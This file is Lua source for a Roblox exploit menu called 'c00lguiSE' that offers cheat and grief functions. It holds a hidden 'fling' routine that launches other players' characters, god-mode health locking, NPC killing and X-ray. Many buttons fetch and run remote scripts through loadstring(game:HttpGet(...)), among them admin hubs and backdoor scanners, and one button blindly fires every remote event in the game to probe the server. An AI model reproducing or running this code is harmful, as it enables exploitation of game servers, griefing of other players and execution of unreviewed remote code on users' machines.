		--Death of a Mortal--
		function KillMortal(hitdude)
	
			---------------------------------------------------------------------------------
	
			if game:GetService("ReplicatedStorage"):FindFirstChild("juisdfj0i32i0eidsuf0iok") then
				hiddenfling = true
			else
				hiddenfling = true
				detection = Instance.new("Decal")
				detection.Name = "juisdfj0i32i0eidsuf0iok"
				detection.Parent = game:GetService("ReplicatedStorage")
				local function fling()
					local hrp, c, vel, movel = nil, nil, nil, 0.1
					while true do
						game:GetService("RunService").Heartbeat:Wait()
						if hiddenfling then
							local lp = game.Players.LocalPlayer
							while hiddenfling and not (c and c.Parent and hrp and hrp.Parent) do
								game:GetService("RunService").Heartbeat:Wait()
								c = lp.Character
								hrp = c:FindFirstChild("HumanoidRootPart") or c:FindFirstChild("Torso") or c:FindFirstChild("UpperTorso")
							end
							if hiddenfling then
								vel = hrp.Velocity
								hrp.Velocity = vel * 10000 + Vector3.new(0, 10000, 0)
								game:GetService("RunService").RenderStepped:Wait()
								if c and c.Parent and hrp and hrp.Parent then
									hrp.Velocity = vel
								end
								game:GetService("RunService").Stepped:Wait()
								if c and c.Parent and hrp and hrp.Parent then
									hrp.Velocity = vel + Vector3.new(0, movel, 0)
									movel = movel * -1
								end
							end
						end
					end
				end
	
				fling()
			end
	
			wait(2)
	
			hiddenfling = false
	
	
		end
	
		--Arm Touch--
		bladeactive = false
		Hitbox.Touched:connect(function(hit)
			if bladeactive == true then
				if hit.Parent:FindFirstChild("Humanoid")~= nil and hit.Parent:FindFirstChild("HasBeenHit")== nil and hit.Parent ~= chara then
					hitsnd:Play()
					KillMortal(hit.Parent)
				end
			end
		end)
	
		--Teleport--
		function Teleport(pos)
			telesnd:Play()
			local ch = chara:GetChildren()
			for i = 1, #ch do
				if ch[i].ClassName == "Part" and ch[i].Name ~= "HumanoidRootPart" then
					local trace = Instance.new("Part",game.Workspace)
					trace.Size = ch[i].Size
					trace.Material = "Neon"
					trace.BrickColor = BrickColor.new("Really black")
					trace.Transparency = .3
					trace.CanCollide = false
					trace.Anchored = true
					trace.CFrame = ch[i].CFrame
					if ch[i].Name == "Head" then
						mehs = Instance.new("CylinderMesh",trace)
						mehs.Scale = Vector3.new(1.25,1.25,1.25)
					end
					tracedisappear = coroutine.wrap(function()
						wait(1)
						for i = 1, 7 do
							wait(.1)
							trace.Transparency = trace.Transparency + .1
						end
						trace:Destroy()
					end)
					tracedisappear()
				end
			end
			chara.Torso.CFrame = CFrame.new(pos.X,pos.Y,pos.Z)
		end
	
		--Grab--
		function Grab(mouse)
			local hit = mouse.Target
			if hit ~= nil then
				if hit.Parent:FindFirstChild("Humanoid")~=nil then
					local torsy = nil
					if hit.Parent:FindFirstChild("Torso")~=nil then
						torsy = hit.Parent.Torso
					elseif hit.Parent:FindFirstChild("UpperTorso")~=nil then
						torsy = hit.Parent.UpperTorso
					end
					local bodpos = Instance.new("BodyPosition",torsy)
					bodpos.Position = torsy.Position
					wait(1)
					burnsnd:Play()
					hit.Parent.Humanoid.MaxHealth = 100
					bodpos.Position = bodpos.Position + Vector3.new(0,4,0)
					for i = 1, 10 do
						wait(.1)
						BurningEff(torsy)
						hit.Parent.Humanoid.Health = hit.Parent.Humanoid.Health
					end
					KillMortal(hit.Parent)
				end
			else end
		end
	
		--Button1Down--
		dell = false
		function onButton1Down()
			if dell == false then
				dell = true
				swinganim:Play()
				bladeactive = true
				slashsnd:Play()
				wait(.7)
				bladeactive = false
				dell = false
				swinganim:Stop()
			end
		end
	
		--KeyDowns--
		function onKeyDown(key)
			if key == "z" then
				Teleport(Mouse.Hit.p + Vector3.new(0,2,0))
			elseif key == "x" then
				Grab(Mouse)
			end
		end
	
		--Mouse Functions--
		Mouse = player:GetMouse()
		if Mouse then
			Mouse.Button1Down:connect(onButton1Down)
			Mouse.KeyDown:connect(onKeyDown)
		end
	
		--Death--
		chara.Humanoid.Died:connect(function()
			local pat = Instance.new("Part",game.Workspace)
			pat.Transparency = 1
			pat.Anchored = true
			pat.CFrame = chara.Torso.CFrame
			naeeym.Parent = pat
			naeeym.Adornee = pat
			skybox.Parent = game.Workspace
			tecks.Text = "BAD CHOICE"
			tecks.FontSize = "Size48"
			tecks.TextColor3 = Color3.new(1,0,0)
			music1:Stop()
			music2:Stop()
			deathmus.Parent = game.Workspace
			deathex.Parent = game.Workspace
			deathmus:Play()
			deathex:Play()
			game.Lighting.OutdoorAmbient = Color3.new(0,0,0)
			game.Lighting.TimeOfDay = "00:00:00"
			game.Lighting.FogColor = Color3.new(0,0,0)
			game.Lighting.FogEnd = 1000
	
		end)
	
		--Loop Function--
		while true do
			wait(.01)
			chance = math.random(0,100)
			if chance < 10 then
				sel = math.random(1,3)
				if sel == 1 then
					tecks.Text = "NOHOPE"
				elseif sel == 2 then
					tecks.Text = "GIVEUP"
				elseif sel == 3 then
					tecks.Text = "BURNINHELL"
				end
			else tecks.Text = "John Doe"
			end
			if chara.Humanoid.Health > 0 then
				chara.Humanoid.MaxHealth = math.huge
				chara.Humanoid.Health = math.huge
				game.Lighting.OutdoorAmbient = Color3.new(1,0,0)
				game.Lighting.Ambient = Color3.new(1,0,0)
				chara["Left Arm"].BrickColor = BrickColor.new("Cool yellow")
				chara["Right Arm"].BrickColor = BrickColor.new("Cool yellow")
				chara["Left Leg"].BrickColor = BrickColor.new("Medium blue")
				chara["Right Leg"].BrickColor = BrickColor.new("Medium blue")
				chara.Torso.BrickColor = BrickColor.new("Bright yellow")
				chara["Left Arm"].Anchored = false
				chara["Right Arm"].Anchored = false
				chara["Left Leg"].Anchored = false
				chara["Right Leg"].Anchored = false
				chara.Torso.Anchored = false
				ch = chara:GetChildren()
				for i = 1, #ch do
					if ch[i].ClassName == "Accessory" or ch[i].ClassName == "Hat" then
						ch[i]:Destroy()
					end
				end
				tools = player.Backpack:GetChildren()
				for i = 1, #tools do
					if tools[i].ClassName == "HopperBin" then
						tools[i]:Destroy()
					end
				end
				skybox.CFrame = skybox.CFrame * CFrame.fromEulerAnglesXYZ(0,math.rad(1),0)
				tecks.Position = UDim2.new(0,math.random(-3,3),0,math.random(-3,3))
				local jtrace = Instance.new("Part",game.Workspace)
				jtrace.Name = "JDTrace"
				jtrace.Size = Vector3.new(10,0,10)
				jtrace.Position = chara.Torso.Position
				jtrace.CFrame = chara.Torso.CFrame - Vector3.new(0,3,0)
				jtrace.Anchored = true
				jtrace.CanCollide = false
				jtrace.BrickColor = BrickColor.new("Really black")
				jtrace.Material = "Granite"
				BurningEff(jtrace)
				game.Debris:AddItem(jtrace,1)
			end
		end
	
		local npcs = {}
	
		local function disappear(hum)
			if hum:IsA("Humanoid") and not game.Players:GetPlayerFromCharacter(hum.Parent) then
				table.insert(npcs,{hum,hum.HipHeight})
				local rootPart = hum.Parent:FindFirstChild("HumanoidRootPart")
				if rootPart then
					hum.Health = 0
				end      
			end
		end
		for _,hum in pairs(workspace:GetDescendants()) do
			disappear(hum)
		end
	
	end)
	
end;
task.spawn(C_106);
-- StarterGui.c00lguiSE.Main.Pages.Admin Commands/GUIs.Button.ButtonScript
local function C_10a()
local script = G2L["10a"];
	local button = script.Parent
	
	
	function click()
		loadstring(game:HttpGet("https://raw.githubusercontent.com/ltseverydayyou/Nameless-Admin/main/Source.lua"))();
	end
	
	button.MouseButton1Click:Connect(click)
	
end;
task.spawn(C_10a);
-- StarterGui.c00lguiSE.Main.Pages.Admin Commands/GUIs.Button.ButtonScript
local function C_10c()
local script = G2L["10c"];
	local button = script.Parent
	
	
	function click()
		loadstring(game:HttpGet("https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source"))()
	end
	
	button.MouseButton1Click:Connect(click)
	
end;
task.spawn(C_10c);
-- StarterGui.c00lguiSE.Main.Pages.Admin Commands/GUIs.Button.ButtonScript
local function C_10e()
local script = G2L["10e"];
	local button = script.Parent
	
	
	function click()
		loadstring(game:HttpGet("https://raw.githubusercontent.com/fatesc/fates-admin/main/main.lua"))();
	end
	
	button.MouseButton1Click:Connect(click)
	
end;
task.spawn(C_10e);
-- StarterGui.c00lguiSE.Main.Pages.Admin Commands/GUIs.Button.ButtonScript
local function C_110()
local script = G2L["110"];
	local button = script.Parent
	
	
	function click()
		loadstring(game:HttpGet("https://raw.githubusercontent.com/fatesc/fates-admin/main/main.lua"))();
	end
	
	button.MouseButton1Click:Connect(click)
	
end;
task.spawn(C_110);
-- StarterGui.c00lguiSE.Main.Pages.Admin Commands/GUIs.Button.ButtonScript
local function C_112()
local script = G2L["112"];
	local button = script.Parent
	
	
	function click()
		loadstring(game:HttpGet("https://raw.githubusercontent.com/ltseverydayyou/Nameless-Admin/main/ScriptHubNA.lua"))()
	end
	
	button.MouseButton1Click:Connect(click)
	
end;
task.spawn(C_112);
-- StarterGui.c00lguiSE.Main.Pages.Admin Commands/GUIs.Button.ButtonScript
local function C_114()
local script = G2L["114"];
	local button = script.Parent
	
	
	function click()
		loadstring(game:HttpGet('https://pastebin.com/raw/yBLDEdDn'))()
	end
	
	button.MouseButton1Click:Connect(click)
	
end;
task.spawn(C_114);
-- StarterGui.c00lguiSE.Main.Pages.Admin Commands/GUIs.Button.ButtonScript
local function C_116()
local script = G2L["116"];
	local button = script.Parent
	
	
	function click()
		loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-Roblox-Audio-Logger-1522",true))()
	end
	
	button.MouseButton1Click:Connect(click)
	
end;
task.spawn(C_116);
-- StarterGui.c00lguiSE.Main.Pages.Admin Commands/GUIs.Button.ButtonScript
local function C_118()
local script = G2L["118"];
	local button = script.Parent
	
	
	function click()
		loadstring(game:HttpGet("https://raw.githubusercontent.com/ocfi/aqua-hub-is-a-skid-lol/refs/heads/main/animatrix"))()
	end
	
	button.MouseButton1Click:Connect(click)
	
end;
task.spawn(C_118);
-- StarterGui.c00lguiSE.Main.Pages.Admin Commands/GUIs.Button.ButtonScript
local function C_11a()
local script = G2L["11a"];
	local button = script.Parent
	
	
	function click()
		loadstring(game:HttpGet("https://gist.github.com/someunknowndude/38cecea5be9d75cb743eac8b1eaf6758/raw"))()
	end
	
	button.MouseButton1Click:Connect(click)
	
end;
task.spawn(C_11a);
-- StarterGui.c00lguiSE.Main.Pages.Admin Commands/GUIs.Button.ButtonScript
local function C_11c()
local script = G2L["11c"];
	local button = script.Parent
	
	
	function click()
		loadstring(game:HttpGetAsync("https://raw.githubusercontent.com/jLn0n/beckdeer-skenner/main/src/main.lua"))()
	end
	
	button.MouseButton1Click:Connect(click)
	
end;
task.spawn(C_11c);
-- StarterGui.c00lguiSE.Main.Pages.Admin Commands/GUIs.Button.ButtonScript
local function C_11e()
local script = G2L["11e"];
	local button = script.Parent
	
	
	function click()
		loadstring(game:HttpGet('https://raw.githubusercontent.com/IvanTheProtogen/BackdoorLegacy/main/main.lua'))()
	end
	
	button.MouseButton1Click:Connect(click)
	
end;
task.spawn(C_11e);
-- StarterGui.c00lguiSE.Main.Pages.Admin Commands/GUIs.Button.ButtonScript
local function C_120()
local script = G2L["120"];
	local button = script.Parent
	
	
	function click()
		loadstring(game:HttpGet("https://raw.githubusercontent.com/ltseverydayyou/Nameless-Admin/main/comet"))();
	end
	
	button.MouseButton1Click:Connect(click)
	
end;
task.spawn(C_120);
-- StarterGui.c00lguiSE.Main.Pages.Admin Commands/GUIs.Button.ButtonScript
local function C_122()
local script = G2L["122"];
	local button = script.Parent
	
	
	function click()
		loadstring(game:HttpGet('https://pastebin.com/raw/jtNuZTYt'))()
	end
	
	button.MouseButton1Click:Connect(click)
	
end;
task.spawn(C_122);
-- StarterGui.c00lguiSE.Main.Pages.Admin Commands/GUIs.Button.ButtonScript
local function C_124()
local script = G2L["124"];
	local button = script.Parent
	
	
	function click()
		loadstring(game:HttpGet("https://raw.githubusercontent.com/lxte/cmd/main/main.lua"))()
	end
	
	button.MouseButton1Click:Connect(click)
	
end;
task.spawn(C_124);
-- StarterGui.c00lguiSE.Main.Pages.Admin Commands/GUIs.Button.ButtonScript
local function C_126()
local script = G2L["126"];
	local button = script.Parent
	
	
	function click()
		loadstring(game:HttpGet("https://raw.githubusercontent.com/ltseverydayyou/uuuuuuu/refs/heads/main/DexPlusBackup.luau"))()
	end
	
	button.MouseButton1Click:Connect(click)
	
end;
task.spawn(C_126);
-- StarterGui.c00lguiSE.Main.Pages.Admin Commands/GUIs.Button.ButtonScript
local function C_128()
local script = G2L["128"];
	local button = script.Parent
	
	
	function click()
		loadstring(game:HttpGet("https://raw.githubusercontent.com/ltseverydayyou/Nameless-Admin/main/fake%20chatte"))()
	end
	
	button.MouseButton1Click:Connect(click)
	
end;
task.spawn(C_128);
-- StarterGui.c00lguiSE.Main.Pages.Admin Commands/GUIs.Button.ButtonScript
local function C_12a()
local script = G2L["12a"];
	local button = script.Parent
	
	
	function click()
		loadstring(game:HttpGet("https://raw.githubusercontent.com/randomstring0/qwertys/refs/heads/main/qwerty8.lua"))()
	end
	
	button.MouseButton1Click:Connect(click)
	
end;
task.spawn(C_12a);
-- StarterGui.c00lguiSE.Main.Pages.Admin Commands/GUIs.Button.ButtonScript
local function C_12c()
local script = G2L["12c"];
	local button = script.Parent
	
	
	function click()
		loadstring(game:HttpGet("https://raw.githubusercontent.com/NotAtomz/Atom-Scripts/refs/heads/main/ConsoleLineDark.lua"))()
	end
	
	button.MouseButton1Click:Connect(click)
	
end;
task.spawn(C_12c);
-- StarterGui.c00lguiSE.Main.Pages.Admin Commands/GUIs.Button.ButtonScript
local function C_12e()
local script = G2L["12e"];
	local button = script.Parent
	
	
	function click()
		loadstring(game:HttpGet("https://github.com/exxtremestuffs/SimpleSpySource/raw/master/SimpleSpy.lua"))()
	end
	
	button.MouseButton1Click:Connect(click)
	
end;
task.spawn(C_12e);
-- StarterGui.c00lguiSE.Main.Pages.Admin Commands/GUIs.Button.ButtonScript
local function C_130()
local script = G2L["130"];
	local button = script.Parent
	
	
	function click()
		local owner = "Upbolt"
		local branch = "revision"
	
		local function webImport(file)
			return loadstring(game:HttpGetAsync(("https://raw.githubusercontent.com/%s/Hydroxide/%s/%s.lua"):format(owner, branch, file)), file .. '.lua')()
		end
	
		webImport("init")
		webImport("ui/main")
	end
	
	button.MouseButton1Click:Connect(click)
	
end;
task.spawn(C_130);
-- StarterGui.c00lguiSE.Main.Pages.Admin Commands/GUIs.Button.ButtonScript
local function C_132()
local script = G2L["132"];
	local button = script.Parent
	
	
	function click()
		loadstring(game:HttpGet("https://raw.githubusercontent.com/darkdexv2/universalavatarchanger/main/avatarchanger"))()
	end
	
	button.MouseButton1Click:Connect(click)
	
end;
task.spawn(C_132);
-- StarterGui.c00lguiSE.Main.Pages.Admin Commands/GUIs.Button.ButtonScript
local function C_134()
local script = G2L["134"];
	local button = script.Parent
	
	
	function click()
		loadstring(game:HttpGet("https://raw.githubusercontent.com/rangell8/Rexys-Welding-Hub/refs/heads/main/script"))()
	end
	
	button.MouseButton1Click:Connect(click)
	
end;
task.spawn(C_134);
-- StarterGui.c00lguiSE.Main.Pages.Admin Commands/GUIs.Button.ButtonScript
local function C_136()
local script = G2L["136"];
	local button = script.Parent
	
	
	function click()
		--[[----------------------------------------------------------------
	|                ▄▀▄▄▄▄   ▄▀▀▄ ▄▀▄  ▄▀▀█▄▄   ▄▀▀▄  ▄▀▄             |
	|               █ █    ▌ █  █ ▀  █ █ ▄▀   █ █    █   █             |
	|              ▐ █      ▐  █    █ ▐ █    █ ▐     ▀▄▀               |
	|                █        █    █    █    █      ▄▀ █               |
	|               ▄▀▄▄▄▄▀ ▄▀   ▄▀    ▄▀▄▄▄▄▀     █  ▄▀               |
	|              █     ▐  █    █    █     ▐    ▄▀  ▄▀                |
	|              ▐        ▐    ▐    ▐         █    ▐                 |
	|               ▐        ▐    ▐    ▐         █    ▐                |
	|------------------------------------------------------------------|
	|    Credits:    | Binds & Info:                                   |
	|    pigeon#1818 | U                         Open and close output |
	|        hz#4777 | RShift                          Fill suggestion |
	|     Curvn#2646 | ;                               Focus on CMDBar |
	| -------------- | Q                                Open and close |
	|                | LShift+Bksp                        Clear CMDbar |
	|                |                                                 |
	|                | .cmds                             List commands |
	----------------------------------------------------------------]]--
		loadstring(game:HttpGet("https://raw.githubusercontent.com/CMD-X/CMD-X/master/Source",true))()
	end
	
	button.MouseButton1Click:Connect(click)
	
end;
task.spawn(C_136);
-- StarterGui.c00lguiSE.Main.Pages.Admin Commands/GUIs.Button.ButtonScript
local function C_138()
local script = G2L["138"];
	local button = script.Parent
	
	
	function click()
		loadstring(game:HttpGet("https://raw.githubusercontent.com/Exunys/AirHub-V2/main/src/Main.lua"))()
	end
	
	button.MouseButton1Click:Connect(click)
	
end;
task.spawn(C_138);
-- StarterGui.c00lguiSE.Main.Pages.Misc..Button.ButtonScript
local function C_13c()
local script = G2L["13c"];
	local button = script.Parent
	local gui = button.Parent.Parent.Parent.Parent
	
	function click()
		gui:Destroy()
	end
	
	button.MouseButton1Click:Connect(click)
	
end;
task.spawn(C_13c);
-- StarterGui.c00lguiSE.Main.Pages.Misc..Button.ButtonScript
local function C_13e()
local script = G2L["13e"];
	local button = script.Parent
	local StarterGui = game.StarterGui
	
	function click()
		StarterGui:SetCore("DevConsoleVisible", true)
	end
	button.MouseButton1Click:Connect(click)
	
end;
task.spawn(C_13e);
-- StarterGui.c00lguiSE.Main.Pages.Misc..Button.ButtonScript
local function C_140()
local script = G2L["140"];
	local button = script.Parent
	local GUISounds = button.Parent.Parent.Parent.Parent.SoundFeedback
	
	function click()
		if GUISounds.Enabled == true then
			GUISounds.Enabled = false
			button.Text = "GUI Sounds: OFF"
		else
			GUISounds.Enabled = true
			button.Text = "GUI Sounds: ON"
		end
	end
	button.MouseButton1Click:Connect(click)
	
end;
task.spawn(C_140);
-- StarterGui.c00lguiSE.Main.Pages.Misc..Button.ButtonScript
local function C_142()
local script = G2L["142"];
	local button = script.Parent
	
	
	function click()
		loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-R6-Animations-on-R15-16865"))()
	end
	button.MouseButton1Click:Connect(click)
	
end;
task.spawn(C_142);
-- StarterGui.c00lguiSE.Main.Pages.Misc..Button.ButtonScript
local function C_144()
local script = G2L["144"];
	local button = script.Parent
	local PlaceId = game.PlaceId
	local JobId = game.JobId
	local HttpService = game.HttpService
	local Players = game.Players
	local TeleportService = game:GetService("TeleportService")
	
	function click()
		local success, res = pcall(function()
			return game:HttpGet(
				"https://games.roblox.com/v1/games/" ..
					PlaceId ..
					"/servers/Public?sortOrder=Desc&limit=100&excludeFullGames=true"
			)
		end)
	
		if not success then
			return game:GetService("StarterGui"):SetCore("SendNotification", {
				Title = "c00lgui",
				Text = "HTTP Request Failed!",
				Icon = "http://www.roblox.com/asset/?id=117945919346512",
				Duration = 2.5,
			})
		end
	
		local body
		local ok, err = pcall(function()
			body = HttpService:JSONDecode(res)
		end)
		if not ok or type(body) ~= "table" or type(body.data) ~= "table" then
			return game:GetService("StarterGui"):SetCore("SendNotification", {
				Title = "c00lgui",
				Text = "Invalid JSON Response",
				Icon = "http://www.roblox.com/asset/?id=117945919346512",
				Duration = 2.5,
			})
		end
	
		local servers = {}
		for _, v in ipairs(body.data) do
			if type(v) == "table"
				and tonumber(v.playing)
				and tonumber(v.maxPlayers)
				and v.playing < v.maxPlayers
				and v.id ~= JobId then
				table.insert(servers, v.id)
			end
		end
	
		if #servers == 0 then
			return game:GetService("StarterGui"):SetCore("SendNotification", {
				Title = "c00lgui",
				Text = "No available servers found!",
				Icon = "http://www.roblox.com/asset/?id=117945919346512",
				Duration = 2.5,
			})
		end
	
		local choice = servers[math.random(1, #servers)]
		TeleportService:TeleportToPlaceInstance(PlaceId, choice, Players.LocalPlayer)
	end
	
	button.MouseButton1Click:Connect(click)
	
end;
task.spawn(C_144);
-- StarterGui.c00lguiSE.Main.Pages.Misc..Button.ButtonScript
local function C_146()
local script = G2L["146"];
	local button = script.Parent
	local COREGUI = game.CoreGui
	
	local Spawn = task.spawn
	local SpawnCall=function(pp)Spawn(function() pcall(pp) end)end
	
	function click()
		local remoteList = {}
		local remoteCount = 0
		local failedCount = 0
	
		local q = {game}
		local qi, qn = 1, 1
		local step = 120
		local n = 0
	
		while qi <= qn do
			local inst = q[qi]
			qi += 1
	
			if inst ~= COREGUI then
				if inst:IsA("RemoteEvent") or inst:IsA("RemoteFunction") then
					remoteList[#remoteList + 1] = inst
				end
	
				local ch = inst:GetChildren()
				for i = 1, #ch do
					local c = ch[i]
					if c ~= COREGUI then
						qn += 1
						q[qn] = c
					end
				end
			end
	
			n += 1
			if n >= step then
				n = 0
				wait()
			end
		end
	
		for i = 1, #remoteList do
			local obj = remoteList[i]
			if obj:IsA("RemoteEvent") then
				local ok = pcall(function()
					obj:FireServer()
				end)
				if ok then
					remoteCount = remoteCount + 1
				else
					failedCount = failedCount + 1
				end
			elseif obj:IsA("RemoteFunction") then
				SpawnCall(function()
					local ok = pcall(function()
						obj:InvokeServer()
					end)
					if ok then
						remoteCount = remoteCount + 1
					else
						failedCount = failedCount + 1
					end
				end)
			end
	
			if i % 25 == 0 then
				wait()
			end
		end
	end
	
	button.MouseButton1Click:Connect(click)
	
end;
task.spawn(C_146);
-- StarterGui.c00lguiSE.Main.Pages.Misc..LocalScript
local function C_149()
local script = G2L["149"];
	local LocalPlayer = game.Players.LocalPlayer
	
	local SP = script.Parent.SP
	local LP = script.Parent.LP
	
	local HRP
	local savedCFrame
	
	local function updateCharacter()
		local character = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
		HRP = character:WaitForChild("HumanoidRootPart")
	end
	
	updateCharacter()
	LocalPlayer.CharacterAdded:Connect(updateCharacter)
	
	local function SavePosition()
		if HRP then
			savedCFrame = HRP.CFrame
		end
	end
	
	local function LoadPosition()
		if savedCFrame and HRP then
			HRP.CFrame = savedCFrame
		else
			game:GetService("StarterGui"):SetCore("SendNotification", {
				Title = "c00lgui",
				Text = "No saved position!",
				Icon = "http://www.roblox.com/asset/?id=117945919346512",
				Duration = 2.5,
			})
		end
	end
	
	SP.MouseButton1Click:Connect(SavePosition)
	LP.MouseButton1Click:Connect(LoadPosition)
	
end;
task.spawn(C_149);
-- StarterGui.c00lguiSE.Main.Pages.Misc..Button.ButtonScript
local function C_14b()
local script = G2L["14b"];
	local button = script.Parent
	
	
	function click()
		local ts = game:GetService("TeleportService")
		local p = game:GetService("Players").LocalPlayer
		ts:Teleport(game.PlaceId, p)
	end
	
	button.MouseButton1Click:Connect(click)
	
end;
task.spawn(C_14b);
-- StarterGui.c00lguiSE.Main.Pages.Misc..Button.ButtonScript
local function C_14d()
local script = G2L["14d"];
	local button = script.Parent
	local Players = game:GetService("Players")
	local LP = Players.LocalPlayer
	local ESPenabled = false
	
	local xrayConn
	
	local function isHumanoidPart(obj)
		local parent = obj.Parent
		for _ = 1, 5 do
			if parent and parent:FindFirstChildOfClass("Humanoid") then
				return true
			end
			if not parent or parent == workspace then
				break
			end
			parent = parent.Parent
		end
		return false
	end
	
	local function togXray(enable)
		if type(enable) ~= "boolean" then
			warn("togXray: expected boolean")
			return
		end
	
		local transparency = enable and 0.5 or 0
	
		if enable then
			xrayConn = workspace.DescendantAdded:Connect(function(desc)
				if desc:IsA("BasePart") and not isHumanoidPart(desc) then
					pcall(function()
						desc.LocalTransparencyModifier = 0.5
					end)
				end
			end)
		else
			if xrayConn then
				xrayConn:Disconnect()
				xrayConn = nil
			end
		end
	
		for _, part in ipairs(workspace:GetDescendants()) do
			if part:IsA("BasePart") and not isHumanoidPart(part) then
				pcall(function()
					part.LocalTransparencyModifier = transparency
				end)
			end
		end
	end
	
	button.MouseButton1Down:Connect(function()
		if button.Text == "X-Ray: OFF" then
			togXray(true)
			button.Text = "X-Ray: ON"
		else
			togXray(false)
			button.Text = "X-Ray: OFF"
		end
	end)
	
end;
task.spawn(C_14d);
-- StarterGui.c00lguiSE.Main.Pages.Misc..Button.ButtonScript
local function C_14f()
local script = G2L["14f"];
	local button = script.Parent
	
	
	function click()
		if button.Text == "Show Hitboxes: OFF" then
			button.Text = "Show Hitboxes: ON"
			settings():GetService("RenderSettings").ShowBoundingBoxes=true
			else
			button.Text = "Show Hitboxes: OFF"
			settings():GetService("RenderSettings").ShowBoundingBoxes=false
		end
	end
	
	button.MouseButton1Click:Connect(click)
	
end;
task.spawn(C_14f);
-- StarterGui.c00lguiSE.Main.Pages.Misc..Button.ButtonScript
local function C_151()
local script = G2L["151"];
	local button = script.Parent
	
	
	function click()
		game:Shutdown()
	end
	
	button.MouseButton1Click:Connect(click)
	
end;
task.spawn(C_151);
-- StarterGui.c00lguiSE.Main.Pages.Asset Viewer.Asset.LocalScript
local function C_155()
local script = G2L["155"];
	local assetid = script.Parent.Parent.Parent.Settings.AssetInput
	
	assetid:GetPropertyChangedSignal("Text"):Connect(function()
		script.Parent.Image = "rbxthumb://type=Asset&id="..assetid.Text.."&w=420&h=420"
	end)
end;
task.spawn(C_155);
-- StarterGui.c00lguiSE.Main.Pages.Asset Viewer.Presets.Button.ButtonScript
local function C_159()
local script = G2L["159"];
	local button = script.Parent
	local input = script.Parent.Parent.Parent.Parent.Settings.AssetInput
	
	
	function click()
		input.Text = button.AssetID.Value
	end
	
	button.MouseButton1Click:Connect(click)
	
end;
task.spawn(C_159);
-- StarterGui.c00lguiSE.Main.Pages.Asset Viewer.Presets.Button.ButtonScript
local function C_15c()
local script = G2L["15c"];
	local button = script.Parent
	local input = script.Parent.Parent.Parent.Parent.Settings.AssetInput
	
	
	function click()
		input.Text = button.AssetID.Value
	end
	
	button.MouseButton1Click:Connect(click)
	
end;
task.spawn(C_15c);
-- StarterGui.c00lguiSE.Main.Pages.Asset Viewer.Presets.Button.ButtonScript
local function C_15f()
local script = G2L["15f"];
	local button = script.Parent
	local input = script.Parent.Parent.Parent.Parent.Settings.AssetInput
	
	
	function click()
		input.Text = button.AssetID.Value
	end
	
	button.MouseButton1Click:Connect(click)
	
end;
task.spawn(C_15f);
-- StarterGui.c00lguiSE.Main.Pages.Asset Viewer.Presets.Button.ButtonScript
local function C_162()
local script = G2L["162"];
	local button = script.Parent
	local input = script.Parent.Parent.Parent.Parent.Settings.AssetInput
	
	
	function click()
		input.Text = button.AssetID.Value
	end
	
	button.MouseButton1Click:Connect(click)
	
end;
task.spawn(C_162);
-- StarterGui.c00lguiSE.Main.Pages.Asset Viewer.Presets.Button.ButtonScript
local function C_165()
local script = G2L["165"];
	local button = script.Parent
	local input = script.Parent.Parent.Parent.Parent.Settings.AssetInput
	
	
	function click()
		input.Text = button.AssetID.Value
	end
	
	button.MouseButton1Click:Connect(click)
	
end;
task.spawn(C_165);
-- StarterGui.c00lguiSE.Main.Pages.Asset Viewer.Presets.Button.ButtonScript
local function C_168()
local script = G2L["168"];
	local button = script.Parent
	local input = script.Parent.Parent.Parent.Parent.Settings.AssetInput
	
	
	function click()
		input.Text = button.AssetID.Value
	end
	
	button.MouseButton1Click:Connect(click)
	
end;
task.spawn(C_168);
-- StarterGui.c00lguiSE.Main.Pages.Asset Viewer.Presets.Button.ButtonScript
local function C_16b()
local script = G2L["16b"];
	local button = script.Parent
	local input = script.Parent.Parent.Parent.Parent.Settings.AssetInput
	
	
	function click()
		input.Text = button.AssetID.Value
	end
	
	button.MouseButton1Click:Connect(click)
	
end;
task.spawn(C_16b);
-- StarterGui.c00lguiSE.Main.UIDrag
local function C_17d()
local script = G2L["17d"];
	-- Made by Real_IceyDev (@lceyDex) --
	-- Simple UI dragger (PC Only/Any device that has a mouse) --
	
	local UIS = game:GetService('UserInputService')
	local frame = script.Parent
	local dragToggle = nil
	local dragSpeed = 0.25
	local dragStart = nil
	local startPos = nil
	
	local function updateInput(input)
		local delta = input.Position - dragStart
		local position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X,
			startPos.Y.Scale, startPos.Y.Offset + delta.Y)
		game:GetService('TweenService'):Create(frame, TweenInfo.new(dragSpeed), {Position = position}):Play()
	end
	
	frame.InputBegan:Connect(function(input)
		if (input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch) then 
			dragToggle = true
			dragStart = input.Position
			startPos = frame.Position
			input.Changed:Connect(function()
				if input.UserInputState == Enum.UserInputState.End then
					dragToggle = false
				end
			end)
		end
	end)
	
	UIS.InputChanged:Connect(function(input)
		if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
			if dragToggle then
				updateInput(input)
			end
		end
	end)
end;
task.spawn(C_17d);
-- StarterGui.c00lguiSE.LocalScript
local function C_180()
local script = G2L["180"];
	local maximize = script.Parent.Maximize
	local main = script.Parent.Main
	local minimize = main.Minimize
	local tweenservice = game:GetService("TweenService")
	
	local mvalue = script.Parent.Main.minimized
	local minsize = UDim2.new(0, 0, 0, 0)
	local minposition = UDim2.new(0, 0, 1, 0)
	local maxsize = UDim2.new(0, 404, 0, 250)
	
	local lastPosition = main.Position
	
	local waittime = 0.1
	local sounds = script.Parent.Sounds
	
	
	mvalue.Value = true
	main.Size = minsize
	main.Position = minposition
	main.Visible = false
	maximize.Visible = true
	
	function toggle()
		if mvalue.Value then
			main.Visible = true
			sounds.Sound3:Play()
	
			tweenservice:Create(main, TweenInfo.new(waittime), {Size = maxsize}):Play()
			tweenservice:Create(main, TweenInfo.new(waittime), {Position = lastPosition}):Play()
	
			maximize.Visible = false
		else
			sounds.Sound3:Play()
	
			lastPosition = main.Position
	
			tweenservice:Create(main, TweenInfo.new(waittime), {Size = minsize}):Play()
			tweenservice:Create(main, TweenInfo.new(waittime), {Position = minposition}):Play()
	
			maximize.Visible = true
			wait(waittime)
			main.Visible = false
		end
		mvalue.Value = not mvalue.Value
	end
	
	maximize.MouseButton1Click:Connect(toggle)
	minimize.MouseButton1Click:Connect(toggle)
	
end;
